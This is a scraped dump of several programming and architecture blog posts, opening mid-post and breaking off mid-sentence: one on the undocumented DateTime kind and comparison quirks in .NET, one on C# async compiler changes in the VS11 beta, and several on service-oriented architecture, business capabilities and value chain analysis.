class=\"Keyword\">new</span>DateTime(2012, 10, 28, 0, 20, 0, DateTimeKind.Utc);<br /><span class=\"Linq\">var</span>original2 =<span class=\"Keyword\">new</span>DateTime(2012, 10, 28, 1, 20, 0, DateTimeKind.Utc);<br /><br /><span class=\"InlineComment\">// Convert to local time</span><br /><span class=\"Linq\">var</span>local1 = original1.ToLocalTime();<br /><span class=\"Linq\">var</span>local2 = original2.ToLocalTime();<br /><br /><span class=\"InlineComment\">// Result is the same for both values. Information loss?</span><br /><span class=\"Linq\">var</span>expected =<span class=\"Keyword\">new</span>DateTime(2012, 10, 28, 1, 20, 0, DateTimeKind.Local);<br />Console.WriteLine(local1 == expected);<span class=\"InlineComment\">// True</span><br />Console.WriteLine(local2 == expected);<span class=\"InlineComment\">// True</span><br />Console.WriteLine(local1 == local2);  <span class=\"InlineComment\">// True</span></div><p>If we've started with two<em>different</em>values, applied the same operation to both, and ended up with equal values, then we must have lost information, right? That doesn't mean that operation is\"bad\" any more than\"dividing by 2\" is bad. You ought to be aware of that information loss, that's all.</p><p>So, we ought to be able to demonstrate that information loss further by converting back from local time to universal time. Here we have the opposite problem: from our local time of 1:20am, we have<em>two</em>valid universal times we could convert to - either 12:20am UTC or 1:20am UTC. Both answers would be correct - they are universal times at which the local time would be 1:20am. So which one will get picked? Well... here's the surprising bit:</p><div class=\"code\"><span class=\"InlineComment\">// Convert back to UTC</span><br /><span class=\"Linq\">var</span>roundTrip1 = local1.ToUniversalTime(); <br /><span class=\"Linq\">var</span>roundTrip2 = local2.ToUniversalTime();<br /><br /><span class=\"InlineComment\">// Values round-trip correctly! Information has been recovered...</span><br />Console.WriteLine(roundTrip1 == original1); <span class=\"InlineComment\">// True</span><br />Console.WriteLine(roundTrip2 == original2); <span class=\"InlineComment\">// True</span><br />Console.WriteLine(roundTrip1 == roundTrip2);<span class=\"InlineComment\">// False</span></div><p>Somehow, each of the local values<em>knows</em>which universal value it came from. The The information has been recovered, so the reverse conversion round-trips each value back to its original one. How is that possible?</p><p>It turns out that DateTime actually has<em>four</em>potential kinds: Local, Utc, Unspecified, and\"local but treat it as the earlier option when resolving ambiguity\". A DateTime is really just a 64-bit number of ticks, but because the range of DateTime is only January 1st 0001 to December 31st 9999. That range can be represented in 62 bits, leaving 2 bits\"spare\" to represent the kind. 2 bits gives 4 possible values... the three documented ones and the shadowy extra one.</p><p>Through experimentation, I've discovered that the kind is preserved if you perform arithmetic on the value, too... so if you go to another\"fall back\" DST transition such as October 30th 2011, the ambiguity resolution works the same way as before:</p><div class=\"code\"><span class=\"Linq\">var</span>local3 = local1.AddYears(-1).AddDays(2); <br /><span class=\"Linq\">var</span>local4 = local2.AddYears(-1).AddDays(2);        <br />Console.WriteLine(local3.ToUniversalTime().Hour);<span class=\"InlineComment\">// 0</span><br />Console.WriteLine(local4.ToUniversalTime().Hour);<span class=\"InlineComment\">// 1</span></div><p>If you use DateTime.SpecifyKind with DateTimeKind.Local, however, it goes back to the\"normal\" kind, even though it<em>looks</em>like it should be a no-op:</p><div class=\"code\"><span class=\"InlineComment\">// Should be a no-op?</span><br /><span class=\"Linq\">var</span>local5 = DateTime.SpecifyKind(local1, local1.Kind); <br />Console.WriteLine(local5.ToUniversalTime().Hour);<span class=\"InlineComment\">// 1</span></div><p>Is this correct behaviour? Or should it be a no-op, just like calling ToLocalTime on a\"local\" DateTime is? (Yes, I've checked - that doesn't lose the information.) It's hard to say, really, as this whole business appears to be undocumented... at least, I haven't seen anything in MSDN about it. (Please add a link in the comments if you find something. The behaviour actually goes against what's documented, as far as I can tell.)</p><p>I haven't looked into whether various forms of serialization preserve values like this faithfully, by the way - but you'd have to work hard to reproduce it in non-framework code. You can't explicitly construct a DateTime with the\"extra\" kind; the only ways I know of to create such a value are via a conversion to local time or through arithmetic on a value which already has the kind. (Admittedly if you're serializing a DateTime with a Kind of Local, you're already on potentially shaky ground, given that you could be deserializing it on a machine with a different system time zone.)</p><h2>Unkind comparisons</h2><p>I've misled you a little, I have to admit. In the code above, when I compared the\"expected\" value with the results of the first conversions, I deliberately specified DateTimeKind.Local in the constructor call. After all, that's the kind we<em>do</em>expect. Well, yes - but I then printed the result of comparing this value with local1 and local2... and those comparisons would have been the same regardless of the kind I'd specified in the constructor.</p><p>All comparisons between DateTimes ignore the Kind property. It's not just restricted to equality. So for example, consider this comparison:</p><div class=\"code\"><span class=\"InlineComment\">// In June: Local time is UTC+1, so 8am UTC is 9am local</span><br /><span class=\"Linq\">var</span>dt1 =<span class=\"Keyword\">new</span>DateTime(2012, 6, 1, 8, 0, 0, DateTimeKind.Utc); <br /><span class=\"Linq\">var</span>dt2 =<span class=\"Keyword\">new</span>DateTime(2012, 6, 1, 8, 30, 0, DateTimeKind.Local); <br />Console.WriteLine(dt1&lt; dt2);<span class=\"InlineComment\">// True</span></div><p>When viewed in terms of\"what instants in time do these both represent?\" the answer here is wrong - when you convert both values into the same time zone (in either direction), dt1 occurs<em>after</em>dt2. But a simple look at the properties tells a different story. In practice, I suspect that most comparisons between DateTime values of different kinds involve code which is at best sloppy and is quite possibly broken in a meaningful way.</p><p>Of course, if you bring Kind=Unspecified into the picture, it becomes impossible to compare meaningfully in a kind-sensitive way. Is 12am UTC before or after 1am Unspecified? It depends what time zone you later use.</p><p>To be clear, it<em>is</em>a hard-to-resolve issue, and one that we don't do terribly well at in Noda Time at the moment for ZonedDateTime. (And even with just LocalDateTime you've got issues between calendars.) This is a situation where providing separate Comparer&lt;T&gt; implementations works nicely - so you can explicitly say what kind of comparison you want.</p><h2>Conclusions</h2><p>There's more fun to be had with a similar situation when we look at TimeZoneInfo, but for now, a few lessons:</p><ul><li>Giving a type different\"modes\" which make it mean fairly significantly different things is likely to cause headaches</li><li>Keeping one of those modes secret (and preventing users from even constructing a value in that mode directly) leads to even more fun and games</li><li>If two instances of your type are considered\"equal\" but behave differently, you should at least consider whether there's something smelly going on</li><li>There's<em>always</em>more fun to be had with DateTime...</li></ul><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1809416\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/tSO4uPGTVe4\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1295}}

Services communicate only by way of exchanging messages that conform to service contracts.  As such, service consumers are dependent only on a service provider's service contract, not its implementation.<br /><br />However if we do not take particular care in designing our service boundaries and responsibilities, and by extension its service contract, then we run the risk that our service contracts may themselves be highly dependent on a service's implementation. One such example of this is<a href=\"http://bill-poole.blogspot.com/2008/05/whitebox-services-are-bad.html\">white box services</a>.<br /><br />Consequently, we want to align our service contracts with concepts that are very stable.  With a<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS approach</a>, services are exposed somewhat arbitrarily.  They do not contribute towards any defined broader architecture.  Therefore service contracts will have an arbitrary level of stability.<br /><br />Next on the list is<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>.  With this approach, service contracts are centred around applications.  They are expressed in terms of the application with which we are integrating.  Consequently if the scope of the application changes, or the application itself is exchanged for another (such as exchanging an Onyx CRM with MS CRM), the service contract is very likely to change.<br /><br />So what about<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">layered service models</a>?  In this case, we have atomic business tasks, business processes and data stores abstracted as services.  These concepts are not at all stable.  Businesses very often make changes in business processes that in turn require changes in how atomic business activities are defined and how data is represented.  With this approach we are very likely to find ourselves changing our service contracts as business processes are updated.<br /><br />But what about business capabilities?  Business capabilities are by their very nature incredibly stable.  Although a retail organisation may make regular changes as to<i>how</i>it goes about inventory management, the fact is that it will<i>always</i>have an inventory management capability.  Moreover, other capabilities within the enterprise don't care<i>how</i>inventory management is performed.  They only care that it<i>is</i>performed.<br /><br />Consequently, aligning our service boundaries (and by extension our service contracts) with business capabilities gives us an incredible amount of stability.  This is the basis of the self-contained process centric-service model introduced in an<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">earlier post</a>.<br /><br />By defining our services around business capabilities we achieve greater business agility by way of being able to update<i>how</i>business functions are performed without influencing other services in our enterprise.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/2d3e4hW4sA4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1296}}

So I thought it appropriate to begin a series of blog posts on the anatomy of a service.<br /><br />So let us begin by restating the definition of a service.  A service (in the context of SOA) is an autonomous coarse grained unit of logic that exposes functionality by way of exchanging messages conforming to its service contract with service consumers via its endpoints.<br /><br />The service contract describes the syntax (not semantics) of messages exchanged via each service endpoint, as well as the means by which messages are carried between each endpoint and service consumers.  Each endpoint is located and uniquely identified by its address.<br /><br />A service provider may also consume other services, and a service consumer may in fact also be a service provider.  As such, the terms<i>service provider</i>and<i>service consumer</i>describe roles in a specific interaction.  The rules governing communication with a service are described by its policy.<br /><br />What do we mean when we say a service is autonomous?  Well we mean a few things actually.  Firstly, services are in control of their own state.  Services are not<i>instantiated</i>by their consumers.  A service exists as a single autonomous entity.<br /><br />Secondly, we mean that services may be under different ownership domains.  Those parties responsible for the service and its management may very likely be different to those responsible for other services.  Services may be versioned and deployed independently of each other.<br /><br />And thirdly, we mean that services should not be dependent upon the availability of other services in order to function without failure - even if that is in some limited capacity.<br /><br />I'd also like to point out that there is the view that a service contract should<i>not</i>be devoid of semantic definition.  There is the thinking that a service contract should also describe the semantics of the messages exchanged by the service, as well as the state the expected behaviour of the service.<br /><br />Okay so now we've defined a service, what does a service look like?  Well that's the beauty of SOA - because service implementations are encapsulated within their service boundaries, consumers don't (or shouldn't anyway) have any visibility or knowledge of the service provider's implementation.<br /><br />But that doesn't really help us much as architects that need to design these things.  That's the reason for this series of blog posts.  We as architects need to understand the different ways to go about designing services - not just their boundaries and responsibilities, but their implementations as well.<br /><br />Over the next few posts I intend to go through various different flavours of service anatomy in order to bring some clarity to the various options that exist for implementing services.

Many of the old existing projects won't compile with VS11 beta, but I'd rather leave them as they are for posterity, showing the evolution of the feature.</p><p>Stephen Toub has an<a href=\"http://blogs.msdn.com/b/pfxteam/archive/2012/02/29/10274035.aspx\">excellent blog post</a>covering some of this, so while I'll<em>mention</em>things he's covered, I won't go into much detail about them. Let's start off there though...</p><p>(EDIT: Stephen has also mailed me with some corrections, which I've edited in - mostly without indication, as the post has been up for less than seven hours, and it'll make for a better reading experience.)</p><h2>Awaiter pattern changes</h2><p>The awaiter pattern is now not<em>just</em>a pattern. The IsCompleted property and GetResult method are still\"loose\" but<a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.inotifycompletion.oncompleted(v=vs.110).aspx\">OnCompleted</a>is now part of an interface:<a href=\"http://msdn.microsoft.com/en-us/library/hh472348(v=vs.110).aspx\">INotifyCompletion</a>. Awaiters<em>have</em>to implement INotifyCompleted, but may<em>also</em>implement<a href=\"http://msdn.microsoft.com/en-us/library/hh472362(v=vs.110).aspx\">ICriticalNotifyCompletion</a>and its<a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.icriticalnotifycompletion.unsafeoncompleted(v=vs.110).aspx\">UnsafeOnCompleted</a>method.</p><p>The OnCompleted method is just as it was before, and needs to flow the execuction context; the UnsafeOnCompleted method is simpler, as it<em>doesn't</em>need to flow the execution context. All of this only matters if you're implementing your own awaiters, of course. (More details in Stephen's blog post. I've found this area somewhat confusing, so please do read his post carefully!)</p><h2>Skeleton method changes</h2><p>Just as I have previously, I'm using the (entirely unofficial) term\"skeleton method\" to mean the very short method created by the compiler with the same signature as an async method: this is the entry point to the async method, effectively, which creates and starts the state machine containing all the<em>real</em>logic.</p><p>There are two changes I've noticed in the skeleton method. Firstly, for some reason the state machine state numbers have changed. Whereas previously a state number of 0 meant\"initial or running\", positive values meant\"between calls, or navigating back to the await expression\" and -1 meant\"finished\", now -1 means\"initial or running\", non-negative means\"between calls, or navigating back to await expression\" and -2 means\"finished\". It's not clear why this change has been made, given that it requires an extra assignment at the start of every skeleton method (to set the state to -1).</p><p>More importantly, the skeleton method no longer calls MoveNext directly on the state machine that it's built. Instead, it calls<a href=\"http://msdn.microsoft.com/en-us/library/hh472313(v=vs.110).aspx\">Start&lt;TStateMachine&gt;</a>on the<a href=\"http://msdn.microsoft.com/en-us/library/hh138506(v=vs.110).aspx\">AsyncTaskMethodBuilder&lt;T&gt;</a>(or whichever method builder it's using). It passes the state machine by reference (presumably for efficiency), and TStateMachine is constrained to implement the now-public-and-in-mscorlib<a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.iasyncstatemachine(v=vs.110).aspx\">IAsyncStateMachine</a>interface. I'll come back to the relationship between the state machine and the builder later on.</p><h2>Task caching</h2><p>(Code is in project 30:<a href=\"http://code.google.com/p/eduasync/source/browse/#hg%2Fsrc%2FTaskCaching\">TaskCaching</a>)</p><p>It's possible for an async method to complete entirely synchronously. In this situation, the result is known before the method returns, and the task returned by the method is already in the RanToCompletionState. If two tasks have already run to completion with the same value, they can be (apparently) regarded as equivalent... so the beta now caches a task in this situation, for some types and values. (Apparently the preview cached too, but I hadn't noticed, and the beta caches more.) According to my experiments and some comments:</p><ul><li>For int, tasks with values -1 to 8 inclusive are cached</li><li>For bool, both values (true and false)</li><li>For char, byte, sbyte, short, ushort, uint, long, ulong, IntPtr and UIntPtr tasks with value 0 (or'\\0') are cached</li><li>For reference types, null is cached</li><li>For other types, no tasks are cached</li></ul><p>EDIT: After they've completed, tasks are normally immutable<em>except for disposal</em>- the cached tasks are tweaked slightly to make disposal a no-op.</p><h2>State machine interface changes</h2><p>In the VS11 preview release, each state machine implemented an interface, but that interface was internal to the generated assembly, and contained a single method (SetMoveNextDelegate). It's now a public interface with two methods:</p><ul><li><a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.iasyncstatemachine.movenext(v=vs.110).aspx\">MoveNext</a></li><li><a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.iasyncstatemachine.setstatemachine(v=vs.110).aspx\">SetStateMachine</a></li></ul><p>Personally I'm not keen on the naming of\"MoveNext\" - I can't help but feel that if we didn't have the\"naming baggage\" of IEnumerator and the fact that at least early on, the code generator was very similar to that used for iterator blocks, we'd have something different. (It<em>is</em>moving to the next state of the state machine, but it still doesn't quite feel right.) I'd favour something like\"ContinueExecution\". However, it doesn't matter - it obviously does what you'd expect, and you're not going to be calling this yourself.</p><p>SetStateMachine is a stranger beast. The documentation states:</p><blockquote><p>Configures the state machine with a heap-allocated replica.</p></blockquote><p>... which says almost nothing, really. The implementation is always simple, just like SetMoveNextDelegate was, although this time it delegates to the builder for the real work (a common theme, as we'll see):</p><div class=\"code\"><span class=\"ValueType\">void</span>IAsyncStateMachine.SetStateMachine(IAsyncStateMachine param0)<br />{<br />   <span class=\"Keyword\">this</span>.&lt;&gt;t__builder.SetStateMachine(param0);<br />}</div><p>Now<a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.asynctaskmethodbuilder.setstatemachine(v=vs.110).aspx\">AsyncTaskMethodBuilder.SetStateMachine</a>is also documented pretty sparsely:</p><blockquote><p>Associates the builder with the specified state machine.</p></blockquote><p>Again, no real help. However, we'll see that it's the<em>builder</em>which is responsible for calling OnContinue now, and as it can call MoveNext on an IStateMachine, it makes sense to tell it which state machine it's associated with... but can't it do that directly?</p><p>Well, not quite. The problem (as I understand it) is around when boxing occurs. We initially create the state machine on the stack, and it contains the builder. (Both are structs.) That's fine until we need a continuation, but then we've got to be able to get back to the current state later, after the current stack frame has been blown away. So we need to box the state machine. That will create a<em>copy</em>of the current builder (within the box). We need the builder within the boxed state machine to contain a reference to the same box. So the order has to be:</p><ul><li>Box the state machine</li><li>Tell the state machine about the boxed reference</li><li>The state machine tells its nested builder about the boxed reference</li></ul><p>Back when the state machine was in charge of the boxing, this went via the delegate: the act of creating the box was implicit when creating the delegate, and then casting the delegate target to the interface type allowed a reference to the newly-created delegate to be set within the copy. This is similar, but using the builder instead. It's hard to follow, but of course it's not going to matter.</p><h2>State machine field changes</h2><p>There are various kinds of fields in the state machine:</p><ul><li>Those corresponding with local variables and parameters in the async method</li><li>The state</li><li>The field(s) associated with awaiters</li><li>(In the preview/beta) The field associated with the\"current execution stack\" at the point of an await expression</li><li>(In the CTP) An unused\"disposing\" field</li></ul><p>Of these, I believe only the awaiters have actually changed, but before we talk about that, let's revisit local variables.</p><h3>Local variable hoisting</h3><p>I've just noticed that the local variables are only hoisted to fields when its scope contains an await expressions, but in that case<em>all</em>local variables of that scope are hoisted, whether or not they're used\"across\" awaits. It would be possible to hoist only those which need to be maintained between executions, but then you wouldn't be able to see the others when debugging, which would be somewhat confusing. Likewise local variables of the same type which are never propagated across the same await<em>could</em>be aliased. For example, consider this async method:</p><div class=\"code\"><span class=\"Modifier\">static</span> <span class=\"Modifier\">async</span>Task&lt;<span class=\"ValueType\">int</span>&gt; M(Random rng)<br />{<br />   <span class=\"ValueType\">int</span>x = rng.Next(1000);<br />   <span class=\"ValueType\">int</span>y = x + rng.Next(1000);<br />        <br />   <span class=\"Modifier\">await</span>Task.Yield();<br />        <br />   <span class=\"ValueType\">int</span>z = y + rng.Next(1000);<br />        <br />   <span class=\"Modifier\">await</span>Task.Yield();<br />   <span class=\"Statement\">return</span>z;<br />}</div><p>If the compiler could be confident you didn't need to debug through this code, it<em>could</em>make do with one field of type\"Random\" and one field of type\"int\" - x can be a completely local variable in MoveNext (it's not used between two awaits) and y and z can be aliased (we never need the value of y after we've first written to z).</p><p>Local variable aliasing probably isn't particularly useful for\"normal\" methods as the JIT may be able to do it (so long as you don't have a debugger attached, potentially) but in this case we expect the state machine to be boxed at some point, so potentially<em>does</em>make a difference (while the stack is typically reasonably small, you could have a<em>lot</em>of outstanding async methods in some scenarios). Maybe in a future release, the C# compiler could have an aggressive optimization mode around this, to be turned on explicitly. (I don't think it should be  a particularly high priority, mind you.)</p><h3>Awaiter fields</h3><p>(Code is in project 31,<a href=\"http://code.google.com/p/eduasync/source/browse/#hg%2Fsrc%2FAwaiterFields\">AwaiterFields</a>.)</p><p>Awaiter fields have changed a bit over the course of async's history.</p><p>In the CTPs (all of them, I believe) each await expression had its own awaiter field in the state machine, with a type corresponding to the declared awaiter type from the awaitable. (Remember that the awaitable is the thing you await, such as a task, and the awaiter is what you get back from calling GetAwaiter on the awaitable).</p><p>In the VS11 Preview, there was always a single awaiter field of type object. From what I saw, it was usually populated with a single-element array containing an awaiter. For value type awaiters (i.e. where the awaiter is a struct) this is somewhat similar to boxing, but maintaining strong typing, so calls to IsCompleted etc can still be made. It's possible that reference type awaiters were stored without the array creation, as it would serve no purpose. (I don't have any machines with just the preview installed to verify this.)</p><p>In the Beta, we have a mixture. If there are any reference type awaiters, they all end up being stored in a single field of type object, which is then cast back to the actual type when required. (Don't forget that only one awaiter can be\"active\" at a time, which makes this possible.) This includes awaiters of an interface type - it's only the<em>compile-time</em>type declared as the return type of the GetAwaiter method of the awaitable which is important.</p><p>If any of the awaiter types are value types, each of these types gets its own field. So there might be a TaskAwaiter&lt;int&gt; field and a TaskAwaiter&lt;string&gt; field, for example. However, there can still be\"sharing\" going on: if there are multiple await expressions all of the same value type awaiter, they will all share a single field. (This all feels a<em>little</em>like the JITting of generics, but it's somewhat coincidental.)</p><h2>MoveNext method changes</h2><p>(Code is in project 32, BetaStateMachine)</p><p>As I've mentioned earlier, the builder is now responsible for a lot more of the work than it was in earlier versions. The majority of the code remains the same as far as I can tell, in terms of handling branching, evaluating expressions with multiple await expressions and so on.  The code in the source repository shows what the complete state machine looks like, but for the sake of clarity, I'll just focus on a single snippet. If we have an await expression like this:</p><div class=\"code\"><span class=\"Modifier\">await</span>x;</div><p>then the state machine code in the VS11 Preview would look something like this:</p><div class=\"code\">localTaskAwaiter = x.GetAwaiter();<br /><span class=\"Statement\">if</span>(localTaskAwaiter.IsCompleted)<br />{<br />   <span class=\"Statement\">goto</span>AwaitCompleted;<br />}<br /><span class=\"Keyword\">this</span>.state = 1;<br />TaskAwaiter[] awaiterArray = { localTaskAwaiter };<br /><span class=\"Keyword\">this</span>.awaiter = awaiterArray;<br />Action continuation =<span class=\"Keyword\">this</span>.MoveNextDelegate;<br /><span class=\"Statement\">if</span>(continuation ==<span class=\"Keyword\">null</span>)<br />{<br />    Task&lt;<span class=\"ValueType\">int</span>&gt; task =<span class=\"Keyword\">this</span>.builder.Task;<br />    continuation = MoveNext;<br />    ((IStateMachine) continuation.Target).SetMoveNextDelegate(continuation);<br />}<br />awaiterArray[0].OnCompleted(continuation);<br />...<br /><span class=\"Statement\">return</span>;</div><p>(That's just setting up the await, of course - there's then the bit where the result is fetched, but that's less interesting. There's also the matter of doFinallyBodies.)</p><p>In the VS11 Beta, it's something this instead (for an awaiter type\"AwaiterType\" which implements ICriticalNotifyCompletion, in a state machine of type ThisStateMachine).</p><div class=\"code\">localAwaiter = x.GetAwaiter();<br /><span class=\"Statement\">if</span>(!localAwaiter.IsCompleted)<br />{<br />    state = 0;<br />    awaiterField = localAwaiter;<br />    builder.AwaitUnsafeOnCompleted&lt;AwaiterType, ThisStateMachine&gt;(<span class=\"MethodParameter\">ref</span>localAwaiter,<span class=\"MethodParameter\">ref</span> <span class=\"Keyword\">this</span>);<br />    doFinallyBodies =<span class=\"Keyword\">false</span>;<br />   <span class=\"Statement\">return</span>;<br />}</div><p>If the awaiter type only implements INotifyCompletion, it calls<a href=\"http://msdn.microsoft.com/en-us/library/hh472321(v=vs.110).aspx\">AwaitOnCompleted</a>instead. Note how the calls are generic (but both type variables are constrained to implement appropriate interfaces) which avoids boxing.</p><p>The call to the builder will call<em>back</em>to the state machine's SetStateMachine method if this is the first awaiter that hasn't already completed within this execution of the async method. So that handles the section which checked for the continuation being null in the first block of code. Most of the rest of the change is explained by the difference in awaiter types, and obviously AwaitOnCompleted/AwaitUnsafeOnCompleted<em>also</em>ends up calling into OnCompleted on the awaiter itself.</p><h2>Mutable value type awaiters</h2><p>(Code is in project 32,<a href=\"http://code.google.com/p/eduasync/source/browse/#hg%2Fsrc%2FMutableAwaiters\">MutableAwaiters</a>)</p><p>One subtle difference which<em>really</em>shouldn't hurt people but is fun to explore is what happens if you have an awaiter which is a mutable value type. Due to the way awaiters were carefully handled pre-beta, mutations which were conducted as part of OnCompleted would still be visible in GetResult. That's<em>not</em>the case in the beta (as Stephen mentions in his blog post). Mind you, it doesn't mean that<em>all</em>mutations will be ignored... just ones in OnCompleted. A mutation from IsCompleted is still visible, as shown here:</p><div class=\"code\"><span class=\"Modifier\">public</span> <span class=\"ValueType\">struct</span>MutableAwaiter : INotifyCompletion<br />{<br />    <span class=\"Modifier\">private</span> <span class=\"ReferenceType\">string</span>message;<br /><br />    <span class=\"Modifier\">public</span>MutableAwaiter(<span class=\"ReferenceType\">string</span>message)<br />     {<br />        <span class=\"Keyword\">this</span>.message = message;<br />     }<br /><br />    <span class=\"Modifier\">public</span> <span class=\"ValueType\">bool</span>IsCompleted<br />     {<br />         get<br />         { <br />             message =<span class=\"String\">\"Set in IsCompleted\"</span>;<br />            <span class=\"Statement\">return</span> <span class=\"Keyword\">false</span>;<br />         }<br />     }<br /><br />    <span class=\"Modifier\">public</span> <span class=\"ValueType\">void</span>OnCompleted(Action action)<br />     {<br />         message =<span class=\"String\">\"Set in OnCompleted\"</span>;<br />        <span class=\"InlineComment\">// Ick! Completes inline. Never mind, it's only a demo...</span><br />         action();<br />     }<br /><br />    <span class=\"Modifier\">public</span> <span class=\"ReferenceType\">string</span>GetResult()<br />     {<br />        <span class=\"Statement\">return</span>message;<br />     }<br />}</div><p>What would you expect to be returned from this awaiter? You can verify that all three members are called... but\"Set in IsCompleted\" is returned. That's because IsCompleted is called<em>before</em>the awaiter value is copied into a field within the state machine. Even though the state machine passes the awaiter by reference, it's passing the<em>local</em>variable, which is of course a separate variable from the field.</p><p>I'm<em>absolutely not</em>suggesting that you should rely on any of this behaviour. If you really need to be able to mutate your awaiter, make it a reference type.</p><h2>Conclusion</h2><p>The main changes in the Beta are around the interactions between the AsyncTaskMethodBuilder (et al) and the state machine, including the new interfaces for awaiters. There's been quite a bit of optimization, although I still see room for a bit more:</p><ul><li>When there's only a single kind of reference type awaiter, the field for storing it could be of that type rather than of type object, removing the need for an execution-time cast</li><li>The\"stack\" variable could be removed in some cases, and made into a specific type in many others</li><li>With appropriate optimization flags, local variables which aren't used await expressions could stay local to the state machine instead of being hoisted, and hoisted variables could be aliased in some cases.</li></ul><p>One thing which concerns me slightly is how the C# language specification is going to change - the addition of the new interfaces is definitely going to mean more complexity from this previously\"tidy\" feature. I'm sure it's worth it for the sake of efficiency and the like, but part of me sighs at every added tweak.</p><p>So, is this now close to the finished version of async? Only time will tell. I haven't checked whether dynamic awaitables have finally been introduced... if they have, I'll put that in the next post.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1807031\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/RJXvEh-Qhn4\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1298}}

A business service can be seen as a cohesive business capability that does not share process, data or business rules with any other capability.<br /><br />The interface (or service contract) between business services is expressed in terms of business events.  Business services are not dependent on how other business services are fulfilled, only the business events they raise.  Consequently, the business architecture description is very stable.  We can update process implementations without impacting any other processes so long as the high level business events are unaffected.<br /><br />Our technical service components are then aligned with our business services and business events, extending this stability and loose coupling to our IT architecture.<br /><br />So business capabilities are the key ingredient in determining our service model.  But how do we go about identifying business capabilities?  Do we simply think about what a business does at a high level and decompose?  Or is there a better way?<br /><br />A while back<a href=\"http://blogs.msdn.com/nickmalik/\">Nick Malik</a>wrote about the<a href=\"http://blogs.msdn.com/nickmalik/archive/2008/04/24/merging-capability-modeling-with-process-modeling.aspx\">relationship between capability modelling and process modelling</a>.  He posed the question as to whether these two approaches conflict, or if they are in fact complimentary.  If you've been reading my recent posts on the matter you would probably guess that I feel the two approaches are very much complimentary.<br /><br />Nick suggests that there are two main approaches one may take in identifying business capabilities.  One is process centric where capabilities are defined around process areas within an organisation.  The other suggested approach is to align business capabilities with organisational structure.  In this approach, capabilities mirror the structure of a business (such as divisions, departments, business units and teams), rather than its processes.<br /><br />As you've probably gleaned from my previous posts on business architecture modelling, I very much favour the process centric approach.  In fact, the premise of modelling business services around capabilities<i>relies</i>on the capabilities being process-centric.  As I mentioned above, the interface between business services is expressed in terms of business events.  Business events are raised by business processes.<br /><br />If a single business process were to feature in multiple capabilities (as would be the case if we modelled our capabilities around organisational structure rather than process areas), then multiple capabilities would expose the same business events.  Moreover, updating a single business process would potentially involve updating the implementation of multiple business capabilities.<br /><br />So when using business capabilities as a means of identifying candidate business services we must take a process-centric approach.  How then do we produce a process-centric capability model of our enterprise?  The answer lies with<a href=\"http://en.wikipedia.org/wiki/Value_chain\">Value Chain Analysis</a>.<br /><br />Value Chain Analysis involves identifying the top level process areas (or functions) of an organisation and mapping them as a value chain.  The value chain illustrates the series of top-level processes an organisation uses to take inputs from the market, transform those inputs, and then deliver value added products and/or services back to the market at a profit.  These processes are synergistic in nature.  The total cost of these processes is less than the value added by the organisation, thus justifying the profit margin.<br /><br />A value chain is modelled in terms of primary and support activities.  Primary activities are those that feature in the value chain itself.  They are the processes responsible for engaging with the market and directly transforming inputs into outputs.  Support activities support the primary activities.<br /><br />The value chain for a typical insurance organisation is illustrated below.<br /><br /><a href=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHNuPbDHJI/AAAAAAAAADc/uNNabMQQBM0/s1600-h/Insurance+Value+Chain.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHNuPbDHJI/AAAAAAAAADc/uNNabMQQBM0/s400/Insurance+Value+Chain.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5229186836651515026\" /></a><br />There are seven primary and seven support activities in the above example.  Each activity contains a number of processes that support the activity.  Note that not<i>all</i>processes within a primary activity necessarily directly contribute to the value chain.  A primary activity must only contain at least one process that contributes to the value chain.<br /><br />An organisation may also have multiple value chains.  Multiple value chains may arise where the organisation serves more than one market.  Different markets may be served with fundamentally different processes within the organisation.<br /><br />For example if we were to take two companies supplying completely different products to completely different markets and a merger were to occur, then we would end up with one organisation with two value chains.  Support activities in one value chain may be primary activities in another.<br /><br />The value chain depicts an end-to-end process that executes left to right.  In the above example, Marketing sits at the beginning of the value chain because the business must determine what products it is going to offer before doing anything else.  After determining the product mix and pricing strategy, Risk Modelling must occur to determine the means by which premium will be calculated for each product.<br /><br />Armed with this information, actual pricing (rate charts) can be determined for each product.  Note that this occurs in the Marketing activity.  So we have transitioned<i>back</i>from Risk Modelling to Marketing.  Feedback loops are always going to occur within value chains.  The point is that the first process that had to occur (determining the product mix) lay within the Marketing activity, and thus Marketing sits before Risk Modelling in the value chain.<br /><br />Now the business is in a position to start selling its insurance products to customers.  This is the Sales activity.  The Sales activity involves quotations, proposals, risk assessment and commission calculation.  Commissions are paid to all parties involved in the distribution channel.<br /><br />Once a policy has been sold, it must be written.  This is a Policy Administration activity.  Once the policy has been written, the customer must then be billed.  Once the premium has been paid by the customer, the customer<i>may</i>at some point register a claim.  Note that this activity is optional.  A customer may<i>never</i>register a claim.  The Customer Service function is then responsible for serving the needs of the customer until his or her policy expires.<br /><br />A value chain gives us a<i>functional model</i>of our organisation.  That is, it models the functions an organisation performs without consideration for<i>how</i>they are performed.  This is what gives the model its stability.<br /><br />Later on as we drill down into the lower level processes supporting each activity in the value chain, we start getting into the implementation details.  We start modelling the exact sequence of 